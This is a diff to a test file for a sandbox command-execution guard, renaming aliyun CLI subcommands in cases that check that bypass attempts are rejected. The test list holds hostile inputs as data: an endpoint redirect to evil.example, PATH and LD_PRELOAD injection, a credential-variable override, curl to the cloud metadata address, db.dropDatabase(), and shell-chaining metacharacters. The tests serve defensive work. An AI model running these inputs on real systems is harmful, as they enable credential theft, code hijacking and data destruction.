@@ -29,7 +29,7 @@ describe("run_in_sandbox exec (issue #8)", () => {
     for (const flag of [undefined, false]) {
       const { core, id, spawned } = mk(flag);
       await expect(core.runInSandbox(id, "exec", "echo hi")).rejects.toThrow(/exec is disabled.*allowExec: true/);
-      await expect(core.runInSandbox(id, "exec", "aliyun sls GetLogs --project p")).rejects.toThrow(/exec is disabled/);
+      await expect(core.runInSandbox(id, "exec", "aliyun sls get-logs --project p")).rejects.toThrow(/exec is disabled/);
       expect(spawned).toEqual([]);
       expect(readFileSync(renderWalkthrough(core, id), "utf8")).not.toContain("沙箱任意命令已开启");
     }
@@ -38,31 +38,31 @@ describe("run_in_sandbox exec (issue #8)", () => {
   it("bypass attempts are rejected even when exec is enabled; nothing is spawned", async () => {
     const { core, id, spawned, cliCalls } = mk(true);
     const bad: [string, RegExp][] = [
-      ["aliyun sls GetLogs --project p --endpoint http://evil.example --insecure", /argument not in allowlist|flag not allowed/],
+      ["aliyun sls get-logs --project p --endpoint http://evil.example --insecure", /argument not in allowlist|flag not allowed/],
       ["aliyun ecs DeleteInstance --InstanceId i-1", /not in whitelist/],
-      ["/usr/bin/aliyun sls GetLogs --project p", /looks like aliyun/],
-      ["./aliyun sls GetLogs --project p", /looks like aliyun/],
-      ["ALIYUN sls GetLogs --project p", /looks like aliyun/],
-      ["aliyun.exe sls GetLogs", /looks like aliyun/],
-      ["sh -c 'aliyun sls GetLogs'", /shell\/wrapper/],
+      ["/usr/bin/aliyun sls get-logs --project p", /looks like aliyun/],
+      ["./aliyun sls get-logs --project p", /looks like aliyun/],
+      ["ALIYUN sls get-logs --project p", /looks like aliyun/],
+      ["aliyun.exe sls get-logs", /looks like aliyun/],
+      ["sh -c 'aliyun sls get-logs'", /shell\/wrapper/],
       ["bash -c id", /shell\/wrapper/],
       ["/bin/sh -c id", /shell\/wrapper/],
-      ["env aliyun sls GetLogs", /shell\/wrapper/],
-      ["sudo aliyun sls GetLogs", /shell\/wrapper/],
+      ["env aliyun sls get-logs", /shell\/wrapper/],
+      ["sudo aliyun sls get-logs", /shell\/wrapper/],
       ["xargs aliyun", /shell\/wrapper/],
-      ["timeout 5 aliyun sls GetLogs", /shell\/wrapper/],
-      ["ALIBABA_CLOUD_ACCESS_KEY_ID=x aliyun sls GetLogs", /env assignments are not allowed/],
-      ["PATH=/tmp/evil aliyun sls GetLogs", /env assignments are not allowed/],
+      ["timeout 5 aliyun sls get-logs", /shell\/wrapper/],
+      ["ALIBABA_CLOUD_ACCESS_KEY_ID=x aliyun sls get-logs", /env assignments are not allowed/],
+      ["PATH=/tmp/evil aliyun sls get-logs", /env assignments are not allowed/],
       ["PATH=/tmp/evil node x.js", /env assignments \(PATH\) are not allowed/],
       ["LD_PRELOAD=/tmp/x.so node x.js", /env assignments \(LD_PRELOAD\) are not allowed/], ["FOO=1 node x.js", /env assignments/],
-      ["node wrapper.js aliyun sls GetLogs", /names a credentialed CLI/],
+      ["node wrapper.js aliyun sls get-logs", /names a credentialed CLI/],
       ["python3 run.py /usr/local/bin/mqadmin topicList", /names a credentialed CLI/],
       ["mongosh mongodb://h/db --eval 'db.dropDatabase()'", /query template/],
       ["mongo --eval x", /no run_cli connector/],
       ["mqadmin updateTopic -n ns -t t", /not in whitelist/],
       ["kubectl get pods", /no run_cli connector/],
       ["curl http://169.254.169.254/", /no run_cli connector/],
-      ["echo hi; aliyun sls GetLogs", /metacharacter/],
+      ["echo hi; aliyun sls get-logs", /metacharacter/],
       ["echo $(aliyun)", /metacharacter/],
       ["echo hi | aliyun", /metacharacter/],
     ];
@@ -108,6 +108,6 @@ describe("run_in_sandbox exec (issue #8)", () => {
 
   it("execDecision: unit", () => {
     expect(execDecision("node -v", {})).toEqual({ kind: "run", file: "node", args: ["-v"] });
-    expect(execDecision("aliyun sls ListProject", {})).toMatchObject({ kind: "route", argv: ["sls", "ListProject"] });
+    expect(execDecision("aliyun sls list-project", {})).toMatchObject({ kind: "route", argv: ["sls", "list-project"] });
   });
 });
